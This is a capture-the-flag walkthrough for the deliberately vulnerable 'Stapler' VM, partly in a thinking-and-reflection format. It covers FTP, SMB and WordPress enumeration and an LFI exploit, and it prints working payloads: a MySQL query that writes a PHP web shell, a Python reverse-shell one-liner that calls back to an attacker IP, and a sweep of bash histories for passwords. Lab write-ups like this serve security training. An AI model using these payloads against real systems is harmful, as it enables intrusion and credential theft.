# Stapler: 1 VM

The challenge involved penetration testing and exploiting the "Stapler" VM, focusing on enumeration, vulnerability discovery, and privilege escalation.

## Action plan:

1. **Enumeration:** Identify the target's IP address and perform an `nmap` scan to discover open ports and services.
2. **FTP Exploitation:** Attempt anonymous login to the `FTP` (File Transfer Protocol) service, download any available files, and analyze them for clues.
3. **SSH Enumeration:** Attempt to log in to `SSH` (Secure Shell) with common usernames and passwords, and note any banners or messages.
4. **SMB Enumeration and Exploitation:** Use `smbclient` to enumerate `SMB` (Server Message Block) shares, attempt to access them with discovered usernames and default credentials, download files from accessible shares, and analyze them.
5. **Web Server Enumeration:** Access the web server running on port 12380, analyze the source code, perform a `nikto` scan to identify vulnerabilities and directories, and navigate to discovered directories.
6. **WordPress Enumeration:** Use `wpscan` to enumerate WordPress users, themes, and plugins, and identify vulnerabilities.
7. **LFI Exploitation:** Exploit the `LFI` (Local File Inclusion) vulnerability in the `advanced-video-embed-embed-videos-or-playlists` plugin to obtain MySQL credentials.
8. **MySQL Exploitation:** Connect to the MySQL server using the obtained credentials, retrieve WordPress user password hashes, and upload a PHP command shell.
9. **Reverse Shell and TTY Shell:** Use the PHP command shell to execute a Python reverse shell, establish a connection with `netcat`, and spawn a `TTY` (Terminal for You) shell for better interaction.
10. **Privilege Escalation:** Analyze the bash history to find a user's SSH password, SSH into the target machine with the discovered credentials, use `sudo -l` to check for sudo permissions, and escalate privileges to root.

# Challenge Analysis: Stapler

## 1. Enumeration

<thinking>
The first step in any penetration test is enumeration. We need to find the target's IP address and then scan it to understand what services are running.

**Chain of Thought:**
1. Use `netdiscover` to find the target VM's IP address on the network.
2. Run an `nmap` scan with options `-sS` (SYN scan), `-A` (OS and service detection), `-O` (OS detection), `-n` (no DNS resolution), and `-p1-60000` (scan all ports) to gather information about the target.

</thinking>

<reflection>
- `netdiscover` is a suitable tool for finding active hosts on a local network. `nmap` is the standard tool for port scanning and service detection. The chosen options provide a comprehensive scan.
- **Potential Errors:** The target VM might not be on the same network segment, or `netdiscover` might not detect it due to network configuration. The `nmap` scan might miss some ports or services if the target has a firewall.
</reflection>

## 2. FTP Exploitation

<thinking>
The `nmap` scan revealed that anonymous FTP login is allowed. We need to exploit this to see if we can find any useful information.

**Chain of Thought:**
1. Connect to the FTP server using the `ftp` command and the target's IP address.
2. Log in with the username `anonymous` and the password `anonymous`.
3. Use the `ls` command to list the files on the server.
4. Use the `get` command to download any interesting files.
5. Analyze the downloaded files for clues, such as usernames or passwords.

</thinking>

<reflection>
- Anonymous FTP access is a common misconfiguration that can lead to information disclosure. Downloading and analyzing files is a logical step to find potential vulnerabilities or credentials.
- **Potential Errors:** There might be no files on the FTP server, or the files might not contain any useful information. The FTP server might have restrictions on file downloads.
</reflection>

## 3. SSH Enumeration

<thinking>
We have a username from the FTP note. We should try to SSH into the machine using this username and common passwords.

**Chain of Thought:**
1. Attempt to connect to the SSH server using the `ssh` command, the target's IP address, and the username `root`.
2. When prompted for a password, try common passwords like `root`, `password`, or the username itself.
3. Note any banners or messages displayed during the connection attempt.

</thinking>

<reflection>
- SSH is a common target for brute-force attacks, and weak or default passwords are often used. Banners might reveal information about the system or allowed users.
- **Potential Errors:** The SSH server might not allow root login, or the password might be strong and not easily guessable.
</reflection>

## 4. SMB Enumeration and Exploitation

<thinking>
The `nmap` scan showed open NetBIOS ports, indicating SMB shares. We should enumerate these shares and try to access them.

**Chain of Thought:**
1. Use `smbclient -L` with the target's IP address to list available SMB shares.
2. Based on the share names and comments, attempt to connect to each share using `smbclient //username/sharename -I ip_address -N`. Try usernames like `fred`, `kathy`, or other discovered usernames, and use default passwords or no password with `-N`.
3. Once connected, use `ls` to list files and `cd` to navigate directories.
4. Use `get` to download any interesting files.
5. Analyze the downloaded files for clues, such as configuration files, backups, or user data.

</thinking>

<reflection>
- SMB shares often contain sensitive information, and weak access controls can allow unauthorized access. Downloading and analyzing files is crucial for finding vulnerabilities or credentials.
- **Potential Errors:** Shares might be password-protected, or access might be restricted based on usernames or IP addresses. The downloaded files might not contain any useful information.
</reflection>

## 5. Web Server Enumeration

<thinking>
The `nmap` scan indicated a web server running on port 12380. We need to enumerate this web server to find potential vulnerabilities.

**Chain of Thought:**
1. Access the web server by navigating to `http://192.168.1.13:12380` in a web browser.
2. View the page source code and look for any hidden information, comments, or clues.
3. Run a `nikto` scan against the web server using `nikto -h 192.168.1.13:12380` to identify vulnerabilities, misconfigurations, and interesting directories.
4. Navigate to any discovered directories using the format `https://192.168.1.13:12380/directory_name`. Note the use of `https` even if the `nikto` scan didn't explicitly mention it.
5. Analyze the content of the discovered directories, such as `robots.txt`, `admin112233`, and `blogblog`.

</thinking>

<reflection>
- Web servers are a common attack vector, and enumeration is essential for finding vulnerabilities. Source code analysis, `nikto` scans, and directory browsing are standard techniques for web server enumeration.
- **Potential Errors:** The web server might not have any vulnerabilities, or the discovered directories might be empty or inaccessible. The use of `https` might be incorrect for some directories.
</reflection>

## 6. WordPress Enumeration

<thinking>
The `blogblog` directory appears to be a WordPress installation. We should use `wpscan` to gather more information about this WordPress site.

**Chain of Thought:**
1. Run `wpscan` with the options `--url https://192.168.1.13:12380/blogblog/ --enumerate uap` to enumerate users, themes, and plugins.
2. Analyze the `wpscan` output for information about the WordPress version, installed themes and plugins, and any identified vulnerabilities.
3. Note the enumerated usernames for potential use in later steps.

</thinking>

<reflection>
- `wpscan` is a specialized tool for WordPress enumeration and vulnerability scanning. Enumerating users, themes, and plugins can reveal potential attack vectors.
- **Potential Errors:** `wpscan` might not detect all users, themes, or plugins, or it might not identify all vulnerabilities. The enumerated information might not be exploitable.
</reflection>

## 7. LFI Exploitation

<thinking>
The `wpscan` output identified an LFI vulnerability in the `advanced-video-embed-embed-videos-or-playlists` plugin. We can exploit this to obtain sensitive information.

**Chain of Thought:**
1. Research the identified LFI vulnerability (CVE-2016-10972) and find an exploit script (e.g., from Exploit-DB).
2. Modify the exploit script to handle potential SSL errors by adding the following lines:
   ```python
   import ssl
   ssl._create_default_https_context = ssl._create_unverified_context
   ```
3. Run the exploit script against the target, providing the necessary parameters.
4. If successful, the exploit should retrieve the `wp-config.php` file.
5. Navigate to `https://192.168.1.13:12380/blogblog/wp-content/uploads/` and download the file identified by the exploit script.
6. Remove the `.jpeg` extension from the downloaded file.
7. Open the file and extract the MySQL credentials.

</thinking>

<reflection>
- LFI vulnerabilities allow attackers to read arbitrary files on the server. Exploiting this vulnerability can lead to the disclosure of sensitive information, such as configuration files containing credentials.
- **Potential Errors:** The exploit script might not work, the LFI vulnerability might be patched, or the downloaded file might not contain valid credentials.
</reflection>

## 8. MySQL Exploitation

<thinking>
We have obtained MySQL credentials. We can use these to connect to the database and potentially find more information or escalate privileges.

**Chain of Thought:**
1. Connect to the MySQL server using the obtained credentials: `mysql -u root -p -h 192.168.1.13`.
2. Once connected, use `show databases;` to list available databases.
3. Select the `wordpress` database using `use wordpress;`.
4. Use `show tables;` to list tables in the `wordpress` database.
5. Use `describe wp_users;` to view the structure of the `wp_users` table.
6. Retrieve the usernames and password hashes from the `wp_users` table using `SELECT user_login, user_pass FROM wp_users;`.
7. Upload a PHP command shell to the server using the following SQL query:
   ```sql
   Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
   ```
8. Verify that the shell has been uploaded by navigating to `https://192.168.1.13:12380/blogblog/wp-content/uploads/shell.php`.

</thinking>

<reflection>
- Accessing the database with root privileges allows for data extraction and potential code execution. Uploading a PHP shell provides a way to execute commands on the server.
- **Potential Errors:** The credentials might be incorrect, the database might not contain any sensitive information, or the file upload might fail due to permissions or other restrictions.
</reflection>

## 9. Reverse Shell and TTY Shell

<thinking>
We have a PHP command shell. We can use this to establish a reverse shell and then spawn a TTY shell for better interaction.

**Chain of Thought:**
1. Set up a netcat listener on your attacking machine: `nc -lvp 443`.
2. Use the PHP command shell to execute a Python reverse shell by appending the following to the URL:
   ```
   ?cmd=python%20-c%20'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.7",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
   ```
   Replace `192.168.1.7` with your attacking machine's IP address.
3. Once the reverse shell is established, spawn a TTY shell using:
   ```
   python -c 'import pty;pty.spawn("/bin/bash")'
   ```

</thinking>

<reflection>
- A reverse shell provides a more interactive way to control the target machine. A TTY shell allows for better command execution and job control.
- **Potential Errors:** The reverse shell might fail to connect due to firewall rules or network issues. The TTY shell might not spawn correctly.
</reflection>

## 10. Privilege Escalation

<thinking>
We have a shell on the target machine. We should try to find a way to escalate privileges to root.

**Chain of Thought:**
1. Use the following command to find and display the content of `.bash_history` files on the system, looking for any recorded commands that might reveal credentials or escalation paths:
   ```bash
   find -name ".bash_history" -exec cat {} \;
   ```
2. Analyze the output for usernames and passwords.
3. Attempt to SSH into the target machine using the discovered credentials (e.g., `ssh peter@192.168.1.13`).
4. Once logged in, use `sudo -l` to check if the user has any sudo permissions.
5. If the user has `sudo` permissions to run any command as any user, use `sudo usermod -s /bin/bash peter` to change the user's shell to bash.
6. Use `sudo -i` to switch to the root user.
7. Navigate to the `/root` directory and read the `flag.txt` file to complete the challenge.

</thinking>

<reflection>
- Analyzing bash history can reveal sensitive information, such as previously used credentials. Checking for sudo permissions is a common way to identify privilege escalation opportunities.
- **Potential Errors:** The bash history might be empty or might not contain any useful information. The user might not have sudo permissions, or the `sudo -i` command might be restricted.
</reflection>

# Enumeration

1. **Find Target IP:** Use `netdiscover` to scan the network and identify the target VM's IP address (192.168.1.13 in this case).
    
    ```zsh
    2series@kali:~$ netdiscover
    ```
2. **Port Scan:** Run `nmap` to scan the target's ports and detect services.
    
    ```zsh
    2series@kali:~$ nmap -sS -A -O -n -p1-60000 192.168.1.13
    ```

# FTP Exploitation

1. **Connect to FTP:** Use the `ftp` command to connect to the target's FTP server.
    
    ```zsh
    2series@kali:~$ ftp 192.168.1.13
    ```
2. **Anonymous Login:** Log in with username `anonymous` and password `anonymous`.
3. **Download Files:** Use `ls` to list files, and `get` to download the `note` file.
    
    ```
    ls
    get note
    ```
4. **Analyze Files:** Use `cat` to view the content of the `note` file.
    
    ```
    cat note
    ```

# SSH Enumeration

1. **Attempt SSH Login:** Try to connect to SSH as `root`.
    
    ```zsh
    2series@kali:~$ ssh root@192.168.1.13
    ```
2. **Note Banners:** Observe any banners or messages displayed during the connection attempt.

# SMB Enumeration and Exploitation

1. **List SMB Shares:** Use `smbclient` to list available shares.
    
    ```zsh
    2series@kali:~$ smbclient -L 192.168.1.13
    ```
2. **Connect to Shares:** Attempt to connect to shares like `kathy` and `tmp` using discovered usernames (e.g., `fred`) and no password.
    
    ```zsh
    2series@kali:~$ smbclient //fred/kathy -I 192.168.1.13 -N
    2series@kali:~$ smbclient //fred/tmp -I 192.168.1.13 -N
    ```
3. **Download Files:** Use `ls`, `cd`, and `get` to navigate and download files like `todo-list.txt`, `vsftpd.conf`, `wordpress-4.tar.gz`, and `ls`.
4. **Analyze Files:** Use `cat` to view the content of the downloaded files.

# Web Server Enumeration

1. **Access Web Server:** Navigate to `http://192.168.1.13:12380` in a web browser.
2. **View Source Code:** Examine the page's source code for any clues.
3. **Run Nikto Scan:** Use `nikto` to scan the web server for vulnerabilities.
    
    ```zsh
    2series@kali:~$ nikto -h 192.168.1.13:12380
    ```
4. **Navigate to Directories:** Access discovered directories like `robots.txt`, `admin112233`, and `blogblog` using `https` (e.g., `https://192.168.1.13:12380/robots.txt`).

# WordPress Enumeration

1. **Run WPScan:** Use `wpscan` to enumerate users, themes, and plugins.
    
    ```zsh
    2series@kali:~$ wpscan --url https://192.168.1.13:12380/blogblog/ --enumerate uap
    ```
2. **Analyze Output:** Note the WordPress version, vulnerabilities, and enumerated usernames.

# LFI Exploitation

1. **Find Exploit:** Research the LFI vulnerability in `advanced-video-embed-embed-videos-or-playlists` and find an exploit script.
2. **Modify Exploit:** Add code to handle SSL errors in the exploit script.
    ```python
    import ssl
    ssl._create_default_https_context = ssl._create_unverified_context
    ```
3. **Run Exploit:** Execute the exploit script against the target.
4. **Download File:** Navigate to `https://192.168.1.13:12380/blogblog/wp-content/uploads/` and download the file identified by the exploit.
5. **Extract Credentials:** Remove the `.jpeg` extension from the downloaded file and extract the MySQL credentials.

# MySQL Exploitation

1. **Connect to MySQL:** Use the obtained credentials to connect to the MySQL server.
    
    ```zsh
    2series@kali:~$ mysql -u root -p -h 192.168.1.13
    ```
2. **Retrieve Password Hashes:** Query the `wordpress` database to retrieve WordPress user password hashes.
    
    ```sql
    show databases;
    use wordpress;
    show tables;
    describe wp_users;
    SELECT user_login, user_pass FROM wp_users;
    ```
3. **Upload PHP Shell:** Upload a PHP command shell to the server.
    
    ```sql
    Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
    ```
4. **Verify Shell:** Navigate to `https://192.168.1.13:12380/blogblog/wp-content/uploads/shell.php` to check if the shell is accessible.

# Reverse Shell and TTY Shell

1. **Set Up Netcat Listener:** Start a netcat listener on your attacking machine.
    ```zsh
    2series@kali:~$ nc -lvp 443
    ```
2. **Execute Reverse Shell:** Use the PHP command shell to execute a Python reverse shell.
    ```
    ?cmd=python%20-c%20'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.7",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    ```
    Replace `192.168.1.7` with your attacking machine's IP address.
3. **Spawn TTY Shell:** Spawn a TTY shell using Python.
    ```
    python -c 'import pty;pty.spawn("/bin/bash")'
    ```

# Privilege Escalation

1. **Analyze Bash History:** Find and display the content of `.bash_history` files.
    
    ```zsh
    2series@kali:~$ find -name ".bash_history" -exec cat {} \;
    ```
2. **SSH with Discovered Credentials:** Use the discovered credentials (e.g., for user `peter`) to SSH into the target machine.
    
    ```zsh
    2series@kali:~$ ssh peter@192.168.1.13
    ```
3. **Check Sudo Permissions:** Use `sudo -l` to check for sudo permissions.
4. **Change User Shell:** Change the user's shell to bash if allowed.
    
    ```zsh
    2series@kali:~$ sudo usermod -s /bin/bash peter
    ```
5. **Switch to Root:** Use `sudo -i` to switch to the root user.
6. **Capture the Flag:** Navigate to `/root` and read the `flag.txt` file.
    ```bash
    cd /root
    cat flag.txt
    ```
